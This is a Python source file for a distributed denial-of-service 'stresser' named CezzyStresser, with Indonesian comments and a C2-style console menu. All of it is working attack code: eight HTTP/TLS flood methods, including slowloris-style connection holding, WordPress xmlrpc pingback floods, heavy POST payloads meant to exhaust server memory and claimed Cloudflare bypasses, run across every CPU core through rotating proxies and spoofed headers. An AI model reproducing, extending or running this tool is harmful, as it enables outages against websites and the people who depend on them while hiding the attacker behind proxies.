import os
import sys
import time
import asyncio
import httpx
import requests
import multiprocessing
import threading
import random
import string
import uvloop
from faker import Faker
from colorama import Fore, Style, init
from tabulate import tabulate

# Init
init(autoreset=True)
fake = Faker()

active_tasks = []
task_id_counter = 1
PROXIES = []

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies():
    global PROXIES
    PROXIES = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            for line in lines:
                if len(line.split(":")) == 4 and "://" not in line:
                    ip, port, user, pwd = line.split(":")
                    PROXIES.append(f"http://{user}:{pwd}@{ip}:{port}")
                elif "://" in line:
                    PROXIES.append(line)
                elif len(line.split(":")) == 2:
                    PROXIES.append(f"http://{line}")

def get_random_headers():
    return {
        "User-Agent": fake.user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
    }

def show_banner():
    print(Fore.MAGENTA + r"""
      ██████╗███████╗███████╗███████╗██╗   ██╗
     ██╔════╝██╔════╝╚══███╔╝╚══███╔╝╚██╗ ██╔╝
     ██║     █████╗    ███╔╝   ███╔╝  ╚████╔╝ 
     ██║     ██╔══╝   ███╔╝   ███╔╝    ╚██╔╝  
     ╚██████╗███████╗███████╗███████╗   ██║   
      ╚═════╝╚══════╝╚══════╝╚══════╝   ╚═╝   
                 S T R E S S E R
    """ + Style.RESET_ALL)
    
    print(Fore.CYAN + "Detail Acces:")
    print(f"{Fore.LIGHTMAGENTA_EX}Username: {Fore.WHITE}root       {Fore.LIGHTMAGENTA_EX}concurrents: {Fore.WHITE}999+")
    print(Fore.CYAN + "----------------------------------------------------------------------")
    print(f"{Fore.GREEN}[+] AVAILABLE METHODS:")
    print(f"  {Fore.WHITE}1. {Fore.CYAN}bypass-r2    {Fore.WHITE}: Cloudflare Bypass R2 (Advanced)")
    print(f"  {Fore.WHITE}2. {Fore.CYAN}h2-bypass    {Fore.WHITE}: HTTP/2 Rapid Reset Bypass")
    print(f"  {Fore.WHITE}3. {Fore.CYAN}http-blitz   {Fore.WHITE}: GET/POST Mix + Random URL Path")
    print(f"  {Fore.WHITE}4. {Fore.CYAN}flash        {Fore.WHITE}: Super Fast GET Request (No Delay)")
    print(f"  {Fore.WHITE}5. {Fore.RED}slowloris    {Fore.WHITE}: Keep-Alive Exhaustion (L7 Gacor)")
    print(f"  {Fore.WHITE}6. {Fore.RED}xmlrpc       {Fore.WHITE}: XML-RPC Flood (Bunuh CPU WordPress)")
    print(f"  {Fore.WHITE}7. {Fore.RED}tls-flood    {Fore.WHITE}: TLS Handshake Flood (Bikin Server Capek)")
    print(f"  {Fore.WHITE}8. {Fore.RED}post-heavy   {Fore.WHITE}: Heavy POST Payload (Habiskan RAM)")
    print(f"  {Fore.WHITE}9. {Fore.CYAN}ongoing      {Fore.WHITE}: Liat status attack")
    print(f"  {Fore.WHITE}0. {Fore.CYAN}cls / clear  {Fore.WHITE}: Bersihin layar")
    print(Fore.CYAN + "----------------------------------------------------------------------")
    print(f"{Fore.YELLOW}[!] Format: <method> <url> <port> <time> <concurrency>")
    print(Fore.CYAN + "----------------------------------------------------------------------\n")

def get_ip_info(domain):
    try:
        ip = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=3).json()['Answer'][0]['data']
        info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        return ip, info.get('as', 'Unknown ASN'), info.get('isp', 'Unknown ISP'), info.get('country', 'Unknown')
    except Exception:
        return "0.0.0.0", "Unknown", "Unknown", "Unknown"

# ================= ATTACK ENGINE =================
async def attack_worker(client, url, end_time, method):
    while time.time() < end_time:
        try:
            headers = get_random_headers()
            
            if method == "bypass-r2":
                rand_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                await client.get(f"{url}/{rand_path}", headers=headers, timeout=3.0)
                
            elif method == "h2-bypass":
                await client.get(url, headers=headers, timeout=3.0)
                
            elif method == "http-blitz":
                rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
                if random.choice([True, False]):
                    await client.get(f"{url}?blitz={rand_str}", headers=headers, timeout=3.0)
                else:
                    await client.post(f"{url}?blitz={rand_str}", headers=headers, json={"data": rand_str}, timeout=3.0)
                    
            elif method == "flash":
                await client.get(url, headers=headers, timeout=2.0)

            elif method == "slowloris":
                # Slowloris: Kirim header dikit-dikit, tahan koneksi selama mungkin
                headers["X-Keep-Alive"] = str(random.randint(1000, 9999))
                await client.get(url, headers=headers, timeout=15.0)
                await asyncio.sleep(1) # Tahan bentar biar slot koneksi penuh

            elif method == "xmlrpc":
                # Nembak ke xmlrpc.php (Khas WordPress)
                payload = f"""<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{url}</string></value></param><param><value><string>{url}</string></value></param></params></methodCall>"""
                headers["Content-Type"] = "text/xml"
                await client.post(f"{url}/xmlrpc.php", headers=headers, content=payload, timeout=3.0)

            elif method == "tls-flood":
                # Maksa bikin koneksi HTTPS baru terus-menerus (Close Connection)
                headers["Connection"] = "close"
                await client.get(url, headers=headers, timeout=3.0)

            elif method == "post-heavy":
                # Kirim payload gede (500KB - 1MB) biar RAM server penuh
                payload = {"data": ''.join(random.choices(string.ascii_letters + string.digits, k=500000))}
                await client.post(url, headers=headers, json=payload, timeout=10.0)
                
        except Exception:
            pass

def process_attack(url, duration, concurrency_per_core, method):
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    
    async def run_async():
        end_time = time.time() + int(duration)
        limits = httpx.Limits(max_connections=int(concurrency_per_core), max_keepalive_connections=int(concurrency_per_core))
        
        proxy = random.choice(PROXIES) if PROXIES else None
        
        # verify=False buat nembus SSL aneh
        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, proxy=proxy, timeout=10.0) as client:
            tasks = []
            for _ in range(int(concurrency_per_core)):
                tasks.append(asyncio.create_task(attack_worker(client, url, end_time, method)))
            await asyncio.gather(*tasks)
            
    asyncio.run(run_async())

def start_multiprocessing_attack(url, duration, total_concurrency, method):
    cpu_count = multiprocessing.cpu_count()
    concurrency_per_core = int(total_concurrency) // cpu_count if int(total_concurrency) > cpu_count else 1
    
    print(f"\n{Fore.YELLOW}[*] Menyiapkan {concurrency_per_core} koneksi per Core CPU ({cpu_count} Core)...")
    time.sleep(1)
    print(f"{Fore.GREEN}[*] Tembakan diluncurkan. Cek monitor di bawah:\n")
    
    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=process_attack, args=(url, duration, concurrency_per_core, method))
        p.start()
        processes.append(p)
        
    for p in processes:
        p.join()
        
    global active_tasks
    active_tasks = [t for t in active_tasks if t[1] != url]
    print(f"\n{Fore.GREEN}[+] Attack Selesai!")

def main():
    global task_id_counter
    clear_screen()
    load_proxies()
    show_banner()
    
    while True:
        try:
            prompt = f"{Fore.RED}root {Fore.WHITE}: {Fore.MAGENTA}CezzyStresserC2Api {Fore.WHITE}:1337 > {Style.RESET_ALL}"
            cmd_input = input(prompt).strip()
            
            if not cmd_input: continue
            args = cmd_input.split()
            cmd = args[0].lower()

            if cmd in ["cls", "clear", "menu", "help"]:
                clear_screen()
                load_proxies()
                show_banner()
                
            elif cmd == "ongoing":
                print(f"\n{Fore.MAGENTA}Running")
                if not active_tasks:
                    print(f"{Fore.RED}No ongoing attacks.")
                else:
                    print(tabulate(active_tasks, headers=["#", "HOST", "SINCE", "DURATION", "METHOD"], tablefmt="presto"))
                print()

            elif cmd in ["bypass-r2", "h2-bypass", "http-blitz", "flash", "slowloris", "xmlrpc", "tls-flood", "post-heavy"]:
                if len(args) < 4:
                    print(f"{Fore.RED}Format: {cmd} <url> <port> <time> <concurrency>")
                    continue
                
                raw_url = args[1]
                target_domain = raw_url.replace("https://", "").replace("http://", "").split("/")[0]
                port = args[2]
                duration = args[3]
                total_concurrency = args[4] if len(args) > 4 else "100"

                print(f"\n{Fore.RED}root {Fore.WHITE}: {Fore.MAGENTA}CezzyStresserC2Api {Fore.WHITE}:1337 > {cmd} {raw_url} {port} {duration}")
                time.sleep(0.5)
                
                ip, asn, isp, country = get_ip_info(target_domain)
                
                print(f"{Fore.LIGHTRED_EX}STATUS   : {Fore.RED}[ {Fore.GREEN}Attack Sent Successfully {Fore.RED}]")
                print(f"{Fore.LIGHTRED_EX}TARGET   : {Fore.RED}[ {Fore.WHITE}{raw_url} {Fore.RED}]")
                print(f"{Fore.LIGHTRED_EX}METHOD   : {Fore.RED}[ {Fore.WHITE}{cmd} {Fore.RED}]")
                print(f"{Fore.LIGHTRED_EX}ASN      : {Fore.RED}[ {Fore.WHITE}{asn} {Fore.RED}]")
                print(f"{Fore.LIGHTRED_EX}ISP      : {Fore.RED}[ {Fore.WHITE}{isp} {Fore.RED}]")
                print(f"{Fore.LIGHTRED_EX}COUNTRY  : {Fore.RED}[ {Fore.WHITE}{country} {Fore.RED}]")
                
                if PROXIES:
                    print(f"{Fore.LIGHTRED_EX}MODE     : {Fore.RED}[ {Fore.GREEN}PROXY ROTATOR ({len(PROXIES)} IP) {Fore.RED}]")
                else:
                    print(f"{Fore.LIGHTRED_EX}MODE     : {Fore.RED}[ {Fore.YELLOW}VPS DIRECT IP (BEAST MODE) {Fore.RED}]")

                print(f"{Fore.WHITE}Please After Attack Type [ {Fore.CYAN}cls {Fore.WHITE}] For Back To Home Menu.\n")

                active_tasks.append([task_id_counter, ip, "3", duration, cmd])
                task_id_counter += 1

                bg_thread = threading.Thread(target=start_multiprocessing_attack, args=(raw_url, duration, total_concurrency, cmd))
                bg_thread.daemon = True
                bg_thread.start()

            else:
                print(f"{Fore.RED}Command '{cmd}' tidak dikenali.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    main()